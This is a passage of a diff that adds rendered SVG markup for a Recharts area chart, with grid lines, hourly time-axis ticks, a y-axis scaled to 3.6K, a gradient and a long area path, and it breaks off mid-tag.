+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="170" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="125.36209710409986" y2="125.36209710409986">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="80.72419420819973" y2="80.72419420819973">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="662" y="0" y1="0" y2="0">
+               </line>
+              </g>
+              <g class="recharts-cartesian-grid-vertical">
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="82.21052631578948" x2="82.21052631578948" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="125.15789473684211" x2="125.15789473684211" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="168.10526315789474" x2="168.10526315789474" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="211.05263157894737" x2="211.05263157894737" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="254" x2="254" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="296.9473684210526" x2="296.9473684210526" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="339.89473684210526" x2="339.89473684210526" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="382.8421052631579" x2="382.8421052631579" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="425.7894736842105" x2="425.7894736842105" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="468.7368421052632" x2="468.7368421052632" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="511.6842105263158" x2="511.6842105263158" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="554.6315789473684" x2="554.6315789473684" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="597.578947368421" x2="597.578947368421" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="662" x2="662" y="0" y1="0" y2="170">
+               </line>
+               <line class="chart-grid" fill="none" height="170" offset="[object Object]" stroke="#ccc" stroke-dasharray="3 3" width="612" x="50" x1="50" x2="50" y="0" y1="0" y2="170">
+               </line>
+              </g>
+             </g>
+             <g class="recharts-layer recharts-cartesian-axis recharts-xAxis xAxis">
+              <line class="recharts-cartesian-axis-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="50" x2="662" y="170" y1="170" y2="170">
+              </line>
+              <g class="recharts-cartesian-axis-ticks">
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="82.21052631578948" x2="82.21052631578948" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="82.21052631578948" y="186">
+                 <tspan dy="0.71em" x="82.21052631578948">
+                  18:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="125.15789473684211" x2="125.15789473684211" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="125.15789473684211" y="186">
+                 <tspan dy="0.71em" x="125.15789473684211">
+                  19:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="168.10526315789474" x2="168.10526315789474" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="168.10526315789474" y="186">
+                 <tspan dy="0.71em" x="168.10526315789474">
+                  20:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="211.05263157894737" x2="211.05263157894737" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="211.05263157894737" y="186">
+                 <tspan dy="0.71em" x="211.05263157894737">
+                  21:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="254" x2="254" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="254" y="186">
+                 <tspan dy="0.71em" x="254">
+                  22:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="296.9473684210526" x2="296.9473684210526" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="296.9473684210526" y="186">
+                 <tspan dy="0.71em" x="296.9473684210526">
+                  23:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="339.89473684210526" x2="339.89473684210526" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="339.89473684210526" y="186">
+                 <tspan dy="0.71em" x="339.89473684210526">
+                  00:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="382.8421052631579" x2="382.8421052631579" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="382.8421052631579" y="186">
+                 <tspan dy="0.71em" x="382.8421052631579">
+                  01:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="425.7894736842105" x2="425.7894736842105" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="425.7894736842105" y="186">
+                 <tspan dy="0.71em" x="425.7894736842105">
+                  02:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="468.7368421052632" x2="468.7368421052632" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="468.7368421052632" y="186">
+                 <tspan dy="0.71em" x="468.7368421052632">
+                  03:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="511.6842105263158" x2="511.6842105263158" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="511.6842105263158" y="186">
+                 <tspan dy="0.71em" x="511.6842105263158">
+                  04:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="554.6315789473684" x2="554.6315789473684" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="554.6315789473684" y="186">
+                 <tspan dy="0.71em" x="554.6315789473684">
+                  05:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="597.578947368421" x2="597.578947368421" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="597.578947368421" y="186">
+                 <tspan dy="0.71em" x="597.578947368421">
+                  06:18
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="30" orientation="bottom" stroke="#666" width="612" x="50" x1="662" x2="662" y="170" y1="176" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="30" orientation="bottom" stroke="none" text-anchor="middle" width="612" x="642.8203125" y="186">
+                 <tspan dy="0.71em" x="642.8203125">
+                  07:48
+                 </tspan>
+                </text>
+               </g>
+              </g>
+             </g>
+             <g class="recharts-layer recharts-cartesian-axis recharts-yAxis yAxis">
+              <line class="recharts-cartesian-axis-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="50" x2="50" y="0" y1="0" y2="170">
+              </line>
+              <g class="recharts-cartesian-axis-ticks">
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="170" y2="170">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="170">
+                 <tspan dy="0.355em" x="42">
+                  0
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="125.36209710409986" y2="125.36209710409986">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="125.36209710409986">
+                 <tspan dy="0.355em" x="42">
+                  950
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="80.72419420819973" y2="80.72419420819973">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="80.72419420819973">
+                 <tspan dy="0.355em" x="42">
+                  1.9K
+                 </tspan>
+                </text>
+               </g>
+               <g class="recharts-layer recharts-cartesian-axis-tick">
+                <line class="recharts-cartesian-axis-tick-line" fill="none" font-size="11" height="170" orientation="left" stroke="#666" width="50" x="0" x1="44" x2="50" y="0" y1="0" y2="0">
+                </line>
+                <text class="recharts-text recharts-cartesian-axis-tick-value" fill="#666" font-size="11" height="170" orientation="left" stroke="none" text-anchor="end" width="50" x="42" y="8.5">
+                 <tspan dy="0.355em" x="42">
+                  3.6K
+                 </tspan>
+                </text>
+               </g>
+              </g>
+             </g>
+             <defs>
+              <lineargradient id="background0.12643615227852734" x1="0" x2="0" y1="0" y2="1">
+               <stop class="area-background" offset="5%" stop-opacity="0.7">
+               </stop>
+               <stop class="area-background" offset="95%" stop-opacity="0.1">
+               </stop>
+              </lineargradient>
+             </defs>
+             <g class="recharts-layer recharts-area area-chart">
+              <g class="recharts-layer">
+               <path class="recharts-curve recharts-area-area" d="M50,15.138C51.193,16.801,52.386,18.464,53.579,25.114C54.772,31.764,55.965,47.753,57.158,57.493C58.351,67.232,59.544,77.121,60.737,83.552C61.93,89.982,63.123,92.852,64.316,96.077C65.509,99.302,66.702,98.893,67.895,102.901C69.088,106.908,70.281,115.922,71.474,120.124C72.667,124.326,73.86,126.133,75.053,128.115C76.246,130.096,77.439,130.998,78.632,132.013C79.825,133.028,81.018,133.261,82.211,134.203C83.404,135.146,84.596,137.375,85.789,137.67C86.982,137.965,88.175,137.948,89.368,138.112C90.561,138.276,91.754,138.512,92.947,138.655C94.14,138.798,95.333,138.851,96.526,138.97C97.719,139.089,98.912,139.368,100.105,139.368C101.298,139.368,102.491,139.368,103.684,139.368C104.877,139.368,106.07,139.368,107.263,139.368C108.456,139.368,109.649,139.368,110.842,139.368C112.035,139.368,113.228,139.368,114.421,139.368C115.614,139.368,116.807,139.368,118,139.368C119.193,139.368,120.386,139.368,121.579,139.368C122.772,139.368,123.965,139.368,125.158,139.368C126.351,139.368,127.544,139.368,128.737,139.368C129.93,139.368,131.123,139.368,132.316,139.368C133.509,139.368,134.702,139.368,135.895,139.368C137.088,139.368,138.281,139.368,139.474,139.368C140.667,139.368,141.86,139.368,143.053,139.368C144.246,139.368,145.439,139.368,146.632,139.368C147.825,139.368,149.018,139.368,150.211,139.368C151.404,139.368,152.596,139.368,153.789,139.368C154.982,139.368,156.175,139.368,157.368,139.368C158.561,139.368,159.754,139.368,160.947,139.368C162.14,139.368,163.333,139.368,164.526,139.368C165.719,139.368,166.912,139.368,168.105,139.368C169.298,139.368,170.491,139.368,171.684,139.368C172.877,139.368,174.07,139.368,175.263,139.368C176.456,139.368,177.649,139.368,178.842,139.368C180.035,139.368,181.228,139.368,182.421,139.368C183.614,139.368,184.807,139.368,186,139.368C187.193,139.368,188.386,139.368,189.579,139.368C190.772,139.368,191.965,139.368,193.158,139.368C194.351,139.368,195.544,139.368,196.737,139.368C197.93,139.368,199.123,139.368,200.316,139.368C201.509,139.368,202.702,163.014,203.895,163.024C205.088,163.034,206.281,163.029,207.474,163.039C208.667,163.05,209.86,163.25,211.053,163.259C212.246,163.268,213.439,163.268,214.632,163.272C215.825,163.277,217.018,163.282,218.211,163.287C219.404,163.291,220.596,163.296,221.789,163.3C222.982,163.304,224.175,163.306,225.368,163.309C226.561,163.313,227.754,163.316,228.947,163.319C230.14,163.322,231.333,163.326,232.526,163.33C233.719,163.333,234.912,163.333,236.105,163.34C237.298,163.347,238.491,163.509,239.684,163.516C240.877,163.524,242.07,163.52,243.263,163.528C244.456,163.536,245.649,163.637,246.842,163.643C248.035,163.649,249.228,163.647,250.421,163.652C251.614,163.657,252.807,163.667,254,163.672C255.193,163.677,256.386,163.676,257.579,163.683C258.772,163.691,259.965,164.049,261.158,164.086C262.351,164.122,263.544,164.128,264.737,164.14C265.93,164.152,267.123,164.153,268.316,164.158C269.509,164.162,270.702,164.161,271.895,164.168C273.088,164.174,274.281,164.258,275.474,164.263C276.667,164.268,277.86,164.268,279.053,164.271C280.246,164.273,281.439,164.273,282.632,164.279C283.825,164.284,285.018,164.605,286.211,164.609C287.404,164.613,288.596,164.613,289.789,164.615C290.982,164.617,292.175,164.619,293.368,164.621C294.561,164.623,295.754,164.625,296.947,164.627C298.14,164.629,299.333,164.629,300.526,164.634C301.719,164.639,302.912,164.711,304.105,164.716C305.298,164.721,306.491,164.721,307.684,164.723C308.877,164.725,310.07,164.725,311.263,164.729C312.456,164.734,313.649,164.805,314.842,164.809C316.035,164.813,317.228,164.813,318.421,164.814C319.614,164.816,320.807,164.818,322,164.82C323.193,164.822,324.386,164.823,325.579,164.826C326.772,164.829,327.965,164.835,329.158,164.838C330.351,164.841,331.544,164.84,332.737,164.844C333.93,164.847,335.123,164.865,336.316,164.868C337.509,164.872,338.702,164.872,339.895,164.874C341.088,164.875,342.281,164.877,343.474,164.879C344.667,164.881,345.86,164.882,347.053,164.884C348.246,164.886,349.439,164.886,350.632,164.89C351.825,164.894,353.018,164.931,354.211,164.934C355.404,164.937,356.596,164.937,357.789,164.939C358.982,164.94,360.175,164.94,361.368,164.943C362.561,164.947,363.754,165.449,364.947,165.504C366.14,165.559,367.333,165.583,368.526,165.586C369.719,165.589,370.912,165.59,372.105,165.591C373.298,165.592,374.491,165.594,375.684,165.595C376.877,165.596,378.07,165.598,379.263,165.599C380.456,165.601,381.649,165.603,382.842,165.604C384.035,165.606,385.228,165.607,386.421,165.608C387.614,165.61,388.807,165.611,390,165.613C391.193,165.615,392.386,165.616,393.579,165.618C394.772,165.619,395.965,165.62,397.158,165.621C398.351,165.623,399.544,165.623,400.737,165.625C401.93,165.628,403.123,165.816,404.316,165.893C405.509,165.97,406.702,166.084,407.895,166.086C409.088,166.088,410.281,166.088,411.474,166.089C412.667,166.091,413.86,166.092,415.053,166.093C416.246,166.094,417.439,166.095,418.632,166.096C419.825,166.097,421.018,166.098,422.211,166.099C423.404,166.1,424.596,166.101,425.789,166.102C426.982,166.103,428.175,166.105,429.368,166.106C430.561,166.107,431.754,166.108,432.947,166.109C434.14,166.11,435.333,166.111,436.526,166.112C437.719,166.113,438.912,166.113,440.105,166.113C441.298,166.114,442.491,166.115,443.684,166.116C444.877,166.116,446.07,166.117,447.263,166.118C448.456,166.118,449.649,166.12,450.842,166.12C452.035,166.121,453.228,166.121,454.421,166.121C455.614,166.122,456.807,166.122,458,166.123C459.193,166.125,460.386,166.145,461.579,166.146C462.772,166.147,463.965,166.147,465.158,166.148C466.351,166.148,467.544,166.149,468.737,166.149C469.93,166.15,471.123,166.151,472.316,166.151C473.509,166.152,474.702,166.153,475.895,166.153C477.088,166.154,478.281,166.154,479.474,166.155C480.667,166.155,481.86,166.156,483.053,166.157C484.246,166.157,485.439,166.158,486.632,166.158C487.825,166.159,489.018,166.159,490.211,166.16C491.404,166.16,492.596,166.161,493.789,166.161C494.982,166.162,496.175,166.163,497.368,166.164C498.561,166.164,499.754,166.165,500.947,166.165C502.14,166.166,503.333,166.168,504.526,166.168C505.719,166.169,506.912,166.169,508.105,166.17C509.298,166.17,510.491,166.171,511.684,166.171C512.877,166.172,514.07,166.173,515.263,166.173C516.456,166.174,517.649,166.175,518.842,166.176C520.035,166.176,521.228,166.176,522.421,166.177C523.614,166.177,524.807,166.178,526,166.178C527.193,166.179,528.386,166.178,529.579,166.179C530.772,166.179,531.965,166.181,533.158,166.182C534.351,166.182,535.544,166.183,536.737,166.183C537.93,166.184,539.123,166.184,540.316,166.185C541.509,166.185,542.702,166.186,543.895,166.187C545.088,166.187,546.281,166.187,547.474,166.188C548.667,166.188,549.86,166.189,551.053,166.19C552.246,166.191,553.439,166.193,554.632,166.194C555.825,166.195,557.018,166.196,558.211,166.196C559.404,166.197,560.596,166.198,561.789,166.198C562.982,166.199,564.175,166.2,565.368,166.2C566.561,166.201,567.754,166.201,568.947,166.202C570.14,166.202,571.333,166.203,572.526,166.203C573.719,166.204,574.912,166.205,576.105,166.206C577.298,166.206,578.491,166.207,579.684,166.208C580.877,166.208,582.07,166.209,583.263,166.21C584.456,166.211,585.649,166.211,586.842,166.212C588.035,166.212,589.228,166.213,590.421,166.214C591.614,166.214,592.807,166.215,594,166.216C595.193,166.217,596.386,166.217,597.579,166.218C598.772,166.218,599.965,166.219,601.158,166.219C602.351,166.22,603.544,166.221,604.737,166.221C605.93,166.222,607.123,166.223,608.316,166.223C609.509,166.224,610.702,166.224,611.895,166.225C613.088,166.226,614.281,166.226,615.474,166.227C616.667,166.227,617.86,166.227,619.053,166.228C620.246,166.23,621.439,166.505,622.632,166.506C623.825,166.507,625.018,166.507,626.211,166.508C627.404,166.508,628.596,166.508,629.789,166.509C630.982,166.509,632.175,166.509,633.368,166.51C634.561,166.51,635.754,166.511,636.947,166.512C638.14,166.512,639.333,166.513,640.526,166.513C641.719,166.513,642.912,166.514,644.105,166.515C645.298,166.515,646.491,166.516,647.684,166.516C648.877,166.517,650.07,166.518,651.263,166.518C652.456,166.519,653.649,166.519,654.842,166.519C656.035,166.52,657.228,166.52,658.421,166.52C659.614,166.521,660.807,166.522,662,166.522L662,170C660.807,170,659.614,170,658.421,170C657.228,170,656.035,170,654.842,170C653.649,170,652.456,170,651.263,170C650.07,170,648.877,170,647.684,170C646.491,170,645.298,170,644.105,170C642.912,170,641.719,170,640.526,170C639.333,170,638.14,170,636.947,170C635.754,170,634.561,170,633.368,170C632.175,170,630.982,170,629.789,170C628.596,170,627.404,170,626.211,170C625.018,170,623.825,170,622.632,170C621.439,170,620.246,170,619.053,170C617.86,170,616.667,170,615.474,170C614.281,170,613.088,170,611.895,170C610.702,170,609.509,170,608.316,170C607.123,170,605.93,170,604.737,170C603.544,170,602.351,170,601.158,170C599.965,170,598.772,170,597.579,170C596.386,170,595.193,170,594,170C592.807,170,591.614,170,590.421,170C589.228,170,588.035,170,586.842,170C585.649,170,584.456,170,583.263,170C582.07,170,580.877,170,579.684,170C578.491,170,577.298,170,576.105,170C574.912,170,573.719,170,572.526,170C571.333,170,570.14,170,568.947,170C567.754,170,566.561,170,565.368,170C564.175,170,562.982,170,561.789,170C560.596,170,559.404,170,558.211,170C557.018,170,555.825,170,554.632,170C553.439,170,552.246,170,551.053,170C549.86,170,548.667,170,547.474,170C546.281,170,545.088,170,543.895,170C542.702,170,541.509,170,540.316,170C539.123,170,537.93,170,536.737,170C535.544,170,534.351,170,533.158,170C531.965,170,530.772,170,529.579,170C528.386,170,527.193,170,526,170C524.807,170,523.614,170,522.421,170C521.228,170,520.035,170,518.842,170C517.649,170,516.456,170,515.263,170C514.07,170,512.877,170,511.684,170C510.491,170,509.298,170,508.105,170C506.912,170,505.719,170,504.526,170C503.333,170,502.14,170,500.947,170C499.754,170,498.561,170,497.368,170C496.175,170,494.982,170,493.789,170C492.596,170,491.404,170,490.211,170C489.018,170,487.825,170,486.632,170C485.439,170,484.246,170,483.053,170C481.86,170,480.667,170,479.474,170C478.281,170,477.088,170,475.895,170C474.702,170,473.509,170,472.316,170C471.123,170,469.93,170,468.737,170C467.544,170,466.351,170,465.158,170C463.965,170,462.772,170,461.579,170C460.386,170,459.193,170,458,170C456.807,170,455.614,170,454.421,170C453.228,170,452.035,170,450.842,170C449.649,170,448.456,170,447.263,170C446.07,170,444.877,170,443.684,170C442.491,170,441.298,170,440.105,170C438.912,170,437.719,170,436.526,170C435.333,170,434.14,170,432.947,170C431.754,170,430.561,170,429.368,170C428.175,170,426.982,170,425.789,170C424.596,170,423.404,170,422.211,170C421.018,170,419.825,170,418.632,170C417.439,170,416.246,170,415.053,170C413.86,170,412.667,170,411.474,170C410.281,170,409.088,170,407.895,170C406.702,170,405.509,170,404.316,170C403.123,170,401.93,170,400.737,170C399.544,170,398.351,170,397.158,170C395.965,170,394.772,170,393.579,170C392.386,170,391.193,170,390,170C388.807,170,387.614,170,386.421,170C385.228,170,384.035,170,382.842,170C381.649,170,380.456,170,379.263,170C378.07,170,376.877,170,375.684,170C374.491,170,373.298,170,372.105,170C370.912,170,369.719,170,368.526,170C367.333,170,366.14,170,364.947,170C363.754,170,362.561,170,361.368,170C360.175,170,358.982,170,357.789,170C356.596,170,355.404,170,354.211,170C353.018,170,351.825,170,350.632,170C349.439,170,348.246,170,347.053,170C345.86,170,344.667,170,343.474,170C342.281,170,341.088,170,339.895,170C338.702,170,337.509,170,336.316,170C335.123,170,333.93,170,332.737,170C331.544,170,330.351,170,329.158,170C327.965,170,326.772,170,325.579,170C324.386,170,323.193,170,322,170C320.807,170,319.614,170,318.421,170C317.228,170,316.035,170,314.842,170C313.649,170,312.456,170,311.263,170C310.07,170,308.877,170,307.684,170C306.491,170,305.298,170,304.105,170C302.912,170,301.719,170,300.526,170C299.333,170,298.14,170,296.947,170C295.754,170,294.561,170,293.368,170C292.175,170,290.982,170,289.789,170C288.596,170,287.404,170,286.211,170C285.018,170,283.825,170,282.632,170C281.439,170,280.246,170,279.053,170C277.86,170,276.667,170,275.474,170C274.281,170,273.088,170,271.895,170C270.702,170,269.509,170,268.316,170C267.123,170,265.93,170,264.737,170C263.544,170,262.351,170,261.158,170C259.965,170,258.772,170,257.579,170C256.386,170,255.193,170,254,170C252.807,170,251.614,170,250.421,170C249.228,170,248.035,170,246.842,170C245.649,170,244.456,170,243.263,170C242.07,170,240.877,170,239.684,170C238.491,170,237.298,170,236.105,170C234.912,170,233.719,170,232.526,170C231.333,170,230.14,170,228.947,170C227.754,170,226.561,170,225.368,170C224.175,170,222.982,170,221.789,170C220.596,170,219.404,170,218.211,170C217.018,170,215.825,170,214.632,170C213.439,170,212.246,170,211.053,170C209.86,170,208.667,170,207.474,170C206.281,170,205.088,170,203.895,170C202.702,170,201.509,170,200.316,170C199.123,170,197.93,170,196.737,170C195.544,170,194.351,170,193.158,170C191.965,170,190.772,170,189.579,170C188.386,170,187.193,170,186,170C184.807,170,183.614,170,182.421,170C181.228,170,180.035,170,178.842,170C177.649,170,176.456,170,175.263,170C174.07,170,172.877,170,171.684,170C170.491,170,169.298,170,168.105,170C166.912,170,165.719,170,164.526,170C163.333,170,162.14,170,160.947,170C159.754,170,158.561,170,157.368,170C156.175,170,154.982,170,153.789,170C152.596,170,151.404,170,150.211,170C149.018,170,147.825,170,146.632,170C145.439,170,144.246,170,143.053,170C141.86,170,140.667,170,139.474,170C138.281,170,137.088,170,135.895,170C134.702,170,133.509,170,132.316,170C131.123,170,129.93,170,128.737,170C127.544,170,126.351,170,125.158,170C123.965,170,122.772,170,121.579,170C120.386,170,119.193,170,118,170C116.807,170,115.614,170,114.421,170C113.228,170,112.035,170,110.842,170C109.649,170,108.456,170,107.263,170C106.07,170,104.877,170,103.684,170C102.491,170,101.298,170,100.105,170C98.912,170,97.719,170,96.526,170C95.333,170,94.14,170,92.947,170C91.754,170,90.561,170,89.368,170C88.175,170,86.982,170,85.789,170C84.596,170,83.404,170,82.211,170C81.018,170,79.825,170,78.632,170C77.439,170,76.246,170,75.053,170C73.86,170,72.667,170,71.474,170C70.281,170,69.088,170,67.895,170C66.702,170,65.509,170,64.316,170C63.123,170,61.93,170,60.737,170C59.544,170,58.351,170,57.158,170C55.965,170,54.772,170,53.579,170C52.386,170,51.193,170,50,170Z" fill="url(#background0.12643615227852734)" fill-opacity="0.6" height="170" stroke="none" width="612">
+               </path>
+               <path class="recharts-curve recharts-area-curve" 